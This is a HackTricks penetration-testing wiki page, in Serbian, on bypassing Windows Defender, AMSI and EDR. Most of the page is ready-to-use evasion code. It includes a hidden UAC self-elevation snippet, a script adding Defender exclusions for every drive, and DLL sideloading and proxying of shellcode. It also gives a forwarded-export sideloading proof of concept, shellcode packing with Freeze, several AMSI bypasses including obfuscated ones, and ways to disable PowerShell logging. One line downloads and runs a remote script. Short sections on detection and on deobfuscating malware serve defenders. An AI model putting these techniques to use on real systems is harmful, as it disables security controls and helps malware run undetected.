# Zaobilaženje Antivirus-a (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje rada Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje rada Windows Defender-a lažnim predstavljanjem drugog AV-a.
- [Onemogućite Defender ako ste admin](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu installer-a pre diranja Defender-a

Javno dostupni loader-i koji se predstavljaju kao game cheat-ovi često se isporučuju kao unsigned Node.js/Nexe installer-i koji prvo **traže od korisnika elevaciju**, a tek zatim onesposobljavaju Defender. Tok je jednostavan:

1. Proverite da li postoji administratorski kontekst pomoću `net session`. Komanda uspeva samo kada caller ima admin prava, pa neuspeh ukazuje na to da loader radi kao standardni korisnik.
2. Odmah ponovo pokrenite samog sebe pomoću glagola `RunAs` da biste pokrenuli očekivani UAC consent prompt, uz očuvanje originalne komandne linije.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju „cracked“ software, pa se prompt obično prihvata, čime malware dobija prava potrebna za izmenu Defender policy-ja.<sup>[[26]](#references)</sup>

### Blanket `MpPreference` exclusions for every drive letter

Nakon elevacije, lanci nalik GachiLoader-u maksimalno iskorišćavaju Defender blind spots umesto da potpuno onemoguće servis. Loader najpre prekida GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim dodaje **izuzetno široke exclusions**, tako da svaki user profile, system directory i removable disk postaju nedostupni za skeniranje:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ključna zapažanja:

- Petlja prolazi kroz svaki montirani filesystem (D:\, E:\, USB memorije itd.), tako da se **svaki budući payload postavljen bilo gde na disku ignoriše**.
- Isključivanje ekstenzije `.sys` je usmereno na budućnost — napadači zadržavaju mogućnost da kasnije učitaju unsigned drivere bez ponovnog menjanja Defendera.
- Sve izmene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su exclusions sačuvani ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto nijedan Defender servis nije zaustavljen, naivne provere stanja i dalje prijavljuju „antivirus aktivan“, iako real-time inspekcija uopšte ne obrađuje te putanje.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Trenutno AV-ovi koriste različite metode za proveru da li je fajl malicious ili ne: static detection, dynamic analysis, a kod naprednijih EDR-ova i behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih malicious stringova ili nizova bajtova u binary ili script fajlu, kao i izvlačenjem informacija iz samog fajla (npr. opis fajla, naziv kompanije, digital signatures, ikona, checksum itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do detekcije, jer su oni verovatno već analizirani i označeni kao malicious. Postoji nekoliko načina da se ovakva detekcija zaobiđe:

- **Encryption**

Ako encryptujete binary, AV neće imati način da detektuje vaš program, ali će vam biti potreban neki loader koji će decryptovati i pokrenuti program u memoriji.

- **Obfuscation**

Ponekad je dovoljno samo promeniti neke stringove u binary ili script fajlu da bi prošao AV, ali to može biti vremenski zahtevan zadatak, u zavisnosti od toga šta pokušavate da obfuscate.

- **Custom tooling**

Ako razvijate sopstvene alate, neće postojati poznati bad signatures, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru Windows Defender static detection-a jeste [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u osnovi deli fajl na više segmenata, a zatim zadaje Defenderu da svaki od njih skenira pojedinačno, čime može tačno da vam pokaže koji stringovi ili bajtovi u vašem binary fajlu izazivaju detekciju.

Toplo preporučujem da pogledate ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### **Dynamic analysis**

Dynamic analysis podrazumeva da AV pokreće vaš binary u sandboxu i prati malicious aktivnost (npr. pokušaj decryptovanja i čitanja passworda iz browsera, izvođenje minidump-a nad LSASS-om itd.). Sa ovim delom može biti nešto teže raditi, ali evo nekoliko stvari koje možete uraditi da zaobiđete sandboxe.

- **Sleep before execution** U zavisnosti od načina implementacije, ovo može biti odličan način za zaobilaženje AV dynamic analysis-a. AV-ovi imaju veoma malo vremena za skeniranje fajlova, kako ne bi prekidali korisnikov rad, pa dugi sleep intervali mogu omesti analizu binary fajlova. Problem je u tome što mnogi AV sandboxi mogu jednostavno preskočiti sleep, u zavisnosti od načina implementacije.
- **Checking machine's resources** Sandboxi obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore korisnikov računar. Ovde možete biti i veoma kreativni, na primer proverom temperature CPU-a ili čak brzine ventilatora — nije sve to implementirano u sandboxu.
- **Machine-specific checks** Ako želite da ciljate korisnika čija je workstation pridružena domenu „contoso.local“, možete proveriti domen računara i videti da li se poklapa sa onim koji ste naveli; ako se ne poklapa, možete učiniti da se program ugasi.

Ispostavlja se da je computername Microsoft Defender Sandbox-a HAL9TH, pa u vašem malware-u pre detonacije možete proveriti ime računara. Ako se ime poklapa sa HAL9TH, to znači da se nalazite unutar Defender sandboxa, pa možete učiniti da se program ugasi.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za zaobilaženje sandboxa

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo već rekli u ovom tekstu, **public tools** će pre ili kasnije biti **detektovani**, zato bi trebalo da sebi postavite sledeće pitanje:

Na primer, ako želite da napravite dump LSASS-a, **da li vam je zaista potrebno da koristite mimikatz**? Ili biste mogli da koristite neki drugi, manje poznat projekat koji takođe pravi dump LSASS-a?

Drugi odgovor je verovatno ispravan. Uzmimo mimikatz kao primer: on je verovatno jedan od najdetektovanijih, ako ne i najdetektovaniji malware od strane AV-ova i EDR-ova. Iako je sam projekat veoma dobar, rad sa njim radi zaobilaženja AV-ova predstavlja noćnu moru, zato jednostavno potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Prilikom menjanja payload-a radi evasion-a, obavezno **isključite automatsko slanje sample-ova** u Defenderu i, molimo vas, ozbiljno shvatite: **NEMOJTE UPLOADOVATI NA VIRUSTOTAL** ako vam je cilj dugoročno postizanje evasion-a. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatsko slanje sample-ova i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **dajte prednost korišćenju DLL-ova za evasion**, jer su prema mom iskustvu DLL fajlovi obično **mnogo slabije detektovani** i analizirani, pa je to veoma jednostavan trik za izbegavanje detekcije u nekim slučajevima (naravno, ako vaš payload može da se pokrene kao DLL).

Kao što možemo videti na ovoj slici, DLL Payload iz Havoc-a ima detection rate 4/26 na antiscan.me, dok EXE payload ima detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje običnog Havoc EXE payload-a sa običnim Havoc DLL-om</p></figcaption></figure>

Sada ćemo prikazati nekoliko trikova koje možete koristiti sa DLL fajlovima kako biste bili mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi DLL search order koji loader primenjuje tako što victim application i malicious payload(s) postavlja jedan pored drugog.

Programe podložne DLL Sideloading-u možete pronaći pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledećeg powershell script-a:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijacking-u unutar „C:\Program Files\\“ i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da sami **istražite DLL Hijackable/Sideloadable programe**, ova tehnika je prilično stealthy kada se pravilno izvede, ali ako koristite javno poznate DLL Sideloadable programe, lako možete biti uhvaćeni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku pod nazivom **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program izvršava sa proxy (i malicioznog) DLL-a na originalni DLL, čime se očuvava funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: template izvornog koda DLL-a i originalni DLL sa promenjenim imenom.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), kako biste saznali više o onome o čemu smo detaljnije razgovarali.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE moduli mogu da exportuju funkcije koje su zapravo "forwarders": umesto pokazivanja na kod, export unos sadrži ASCII string u obliku `TargetDll.TargetFunc`. Kada caller razrešava export, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, dobavlja se iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji uključuje direktorijum modula koji obavlja forward razrešavanje.

Ovo omogućava indirektni sideloading primitive: pronađite potpisani DLL koji exportuje funkciju prosleđenu ka nazivu modula koji nije KnownDLL, a zatim smestite taj potpisani DLL zajedno sa DLL-om pod kontrolom napadača, nazvanim tačno kao prosleđeni ciljni modul. Kada se pozove prosleđeni export, loader razrešava forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se razrešava putem uobičajenog redosleda pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u folder sa dozvolom za upis
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Ubacite zlonamerni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan za izvršavanje koda; nije potrebno implementirati prosleđenu funkciju da bi se pokrenuo DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktivirajte prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed ponašanje:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati forward do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što je `DllMain` već izvršen

Saveti za hunting:
- Fokusirajte se na forwarded exports kod kojih ciljni modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Forwarded exports možete enumerisati pomoću alata kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwardera da biste pronašli kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz nesistemskih putanja, nakon čega iz tog direktorijuma učitavaju non-KnownDLLs sa istim osnovnim imenom
- Upozorite na lance procesa/modula kao što su: `rundll32.exe` → nesistemski `keyiso.dll` → `NCRYPTPROV.dll` unutar putanja u koje korisnik može da upisuje
- Primenite pravila integriteta koda (WDAC/AppLocker) i zabranite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je payload toolkit za zaobilaženje EDR-ova pomoću suspendovanih procesa, direct syscalls i alternativnih metoda izvršavanja`

Freeze možete koristiti za učitavanje i izvršavanje vašeg shellcode-a na prikriven način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša; ono što funkcioniše danas sutra može biti detektovano, zato se nikada ne oslanjajte samo na jedan alat. Ako je moguće, pokušajte da ulančate više evasion tehnika.

## Direct/Indirect Syscalls & Rezolucija SSN-a (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hook-ove** na syscall stub-ove u `ntdll.dll`. Da biste zaobišli te hook-ove, možete generisati **direct** ili **indirect** syscall stub-ove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hook-ovanog export entrypoint-a.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: ubacuje `syscall`/`sysenter`/`SVC #0` instrukciju u generisani stub (ne pristupa `ntdll` export-u).
- **Indirect**: skače u postojeći `syscall` gadget unutar `ntdll`-a, tako da izgleda da kernel transition potiče iz `ntdll`-a (korisno za heuristic evasion); **randomized indirect** bira gadget iz pool-a pri svakom pozivu.
- **Egg-hunt**: izbegava ugrađivanje statičke `0F 05` opcode sekvence na disku; syscall sekvencu razrešava tokom runtime-a.

**Strategije za rezoluciju SSN-a otporne na hook-ove:**
- **FreshyCalls (VA sort)**: zaključuje SSN-ove sortiranjem syscall stub-ova prema virtuelnoj adresi, umesto čitanja bajtova stub-a.
- **SyscallsFromDisk**: mapira čisti `\KnownDlls\ntdll.dll`, čita SSN-ove iz njegovog `.text` odeljka, a zatim ga unmap-uje (zaobilazi sve hook-ove u memoriji).
- **RecycledGate**: kombinuje zaključivanje SSN-a sortiranjem prema VA sa validacijom opcode-a kada je stub čist; ako je hook-ovan, vraća se na VA inference.
- **HW Breakpoint**: postavlja DR0 na `syscall` instrukciju i koristi VEH za hvatanje SSN-a iz `EAX` tokom runtime-a, bez parsiranja hook-ovanih bajtova.

Primer korišćenja SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AV-ovi su mogli da skeniraju samo **fajlove na disku**, pa ako biste nekako mogli da izvršite payload-e **direktno u memoriji**, AV nije mogao ništa da uradi kako bi to sprečio, jer nije imao dovoljnu vidljivost.

AMSI funkcija je integrisana u sledeće Windows komponente.

- User Account Control, ili UAC (elevacija EXE, COM, MSI ili ActiveX instalacije)
- PowerShell (skripte, interaktivna upotreba i dinamička evaluacija koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroe

Omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u formi koja je istovremeno nešifrovana i neobfuskovana.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` proizvešće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako dodaje prefiks `amsi:`, a zatim i putanju do izvršnog fajla iz kojeg je skripta pokrenuta, u ovom slučaju powershell.exe

Nismo upisali nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Štaviše, počev od **.NET 4.8**, C# kod se takođe izvršava kroz AMSI. Ovo čak utiče i na `Assembly.Load(byte[])` pri učitavanju izvršavanja u memoriji. Zato se korišćenje nižih verzija .NET-a (kao što je 4.7.2 ili starija) preporučuje za izvršavanje u memoriji ako želite da zaobiđete AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuskacija**

Pošto AMSI uglavnom radi pomoću statičkih detekcija, izmena skripti koje pokušavate da učitate može biti dobar način za izbegavanje detekcije.

Međutim, AMSI ima mogućnost da deobfuskira skripte čak i kada imaju više slojeva, pa obfuskacija može biti loša opcija u zavisnosti od načina na koji je izvedena. Zbog toga njeno zaobilaženje nije sasvim jednostavno. Ipak, ponekad je dovoljno samo promeniti nekoliko naziva promenljivih i problem će biti rešen, pa to zavisi od toga koliko je nešto označeno.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u powershell (kao i cscript.exe, wscript.exe itd.) proces, moguće je lako menjati ga čak i kada se izvršava kao neprivilegovani korisnik. Zbog ovog nedostatka u implementaciji AMSI-ja, istraživači su pronašli više načina za izbegavanje AMSI skeniranja.

**Forcing an Error**

Prisiljavanje AMSI inicijalizacije da ne uspe (`amsiInitFailed`) dovešće do toga da se za trenutni proces ne pokrene skeniranje. Ovo je prvobitno objavio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio signature kako bi sprečio širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bila je dovoljna samo jedna linija PowerShell koda da se AMSI učini neupotrebljivim za trenutni PowerShell proces. Ovu liniju je, naravno, detektovao sam AMSI, pa je potrebna određena izmena kako bi se ova tehnika mogla koristiti.

Evo izmenjenog AMSI bypass-a koji sam preuzeo iz ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti označeno čim ova objava bude objavljena, zato ne bi trebalo da objavljujete nikakav kod ako je vaš plan da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje unosa koji prosleđuje korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na ovaj način rezultat stvarnog skeniranja vraća 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan, jezički nezavisan bypass jeste postavljanje user-mode hook-a na `ntdll!LdrLoadDll`, koji vraća grešku kada je zatraženi modul `amsi.dll`. Kao rezultat toga, AMSI se nikada ne učitava i u tom procesu se ne izvršavaju skeniranja.<sup>[[23]](#references)</sup>

Pregled implementacije (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Napomene
- Radi u PowerShell, WScript/CScript i custom loaderima (u svemu što bi inače učitalo AMSI).
- Kombinujte sa prosleđivanjem skripti putem stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli duge artefakte komandne linije.
- Primećeno je da se koristi sa loaderima izvršenim kroz LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skriptu za bypass AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skriptu za bypass AMSI-ja koja izbegava signature pomoću randomizovane, korisnički definisane funkcije, promenljivih i izraza sa karakterima, kao i primenom nasumičnih velikih i malih slova na PowerShell ključne reči radi izbegavanja signature.

**Uklanjanje detektovanog signature-a**

Možete koristiti alat kao što su **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** za uklanjanje detektovanog AMSI signature-a iz memorije trenutnog procesa. Ovaj alat funkcioniše tako što skenira memoriju trenutnog procesa u potrazi za AMSI signature-om, a zatim ga prepisuje NOP instrukcijama, čime ga efektivno uklanja iz memorije.

**AV/EDR proizvodi koji koriste AMSI**

Listu AV/EDR proizvoda koji koriste AMSI možete pronaći na **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Korišćenje PowerShell verzije 2**
Ako koristite PowerShell verziju 2, AMSI se neće učitati, pa možete pokretati skripte bez AMSI skeniranja. To možete uraditi ovako:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja omogućava beleženje svih PowerShell komandi izvršenih na sistemu. Ovo može biti korisno u svrhe revizije i rešavanja problema, ali takođe može biti **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Disable PowerShell Transcription and Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Ako koristite PowerShell version 2, AMSI se neće učitati, pa možete pokrenuti svoje skripte bez AMSI skeniranja. To možete uraditi ovako: `powershell.exe -version 2`
- **Use an unmanaged PowerShell session**: Koristite [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) za hostovanje PowerShell-a bez pokretanja `powershell.exe` (pristup koji koristi `powerpick` u Cobalt Strike-u). Ovo zaobilazi kontrole vezane konkretno za proces `powershell.exe`, ali samo po sebi ne onemogućava AMSI, Script Block Logging niti svaku drugu PowerShell odbranu; pokrivenost zavisi od runtime-a i implementacije hosta.


## Obfuscation

> [!TIP]
> Nekoliko tehnika obfuscation-a oslanja se na šifrovanje podataka, što će povećati entropiju binarnog fajla i olakšati AV-ovima i EDR-ovima njegovu detekciju. Budite oprezni sa ovim i možda primenite šifrovanje samo na određene delove koda koji su osetljivi ili treba da budu sakriveni.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analiziranja malware-a koji koristi ConfuserEx 2 (ili komercijalne fork-ove), uobičajeno je naići na nekoliko slojeva zaštite koji će blokirati decompiler-e i sandbox-e. Tok rada u nastavku pouzdano **vraća IL približan originalnom**, koji se zatim može decompile-ovati u C# pomoću alata kao što su dnSpy ili ILSpy.<sup>[[10]](#references)</sup>

1.  Uklanjanje Anti-tampering-a – ConfuserEx šifruje svako *method body* i dešifruje ga unutar statičkog konstruktora (`<Module>.cctor`) *module*-a. Takođe menja PE checksum, pa će svaka izmena izazvati rušenje binarnog fajla. Koristite **AntiTamperKiller** da pronađete šifrovane metadata tabele, povratite XOR ključeve i ponovo upišete čistu assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni prilikom izrade sopstvenog unpacker-a.

2.  Oporavak simbola / control-flow-a – prosledite *clean* fajl alatu **de4dot-cex** (fork-u de4dot-a koji podržava ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Zastavice:
• `-p crx` – bira ConfuserEx 2 profil
• de4dot će poništiti control-flow flattening, vratiti originalne namespace-ove, klase i nazive promenljivih i dešifrovati konstantne stringove.

3.  Uklanjanje proxy poziva – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (poznatim i kao *proxy calls*) kako bi dodatno otežao decompilation. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()`, umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijeni binarni fajl u dnSpy-u, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` kako biste pronašli *stvarni* payload. Malware ga često čuva kao TLV-encoded niz bajtova inicijalizovan unutar `<Module>.byte_0`.

Navedeni chain vraća tok izvršavanja **bez potrebe za pokretanjem zlonamernog uzorka** – korisno pri radu na offline workstation-u.

> 🛈  ConfuserEx generiše custom attribute pod nazivom `ConfusedByAttribute`, koji se može koristiti kao IOC za automatsko triage-ovanje uzoraka.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) compilation suite-a koji pruža povećanu softversku bezbednost putem [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i zaštite od neovlašćenih izmena.
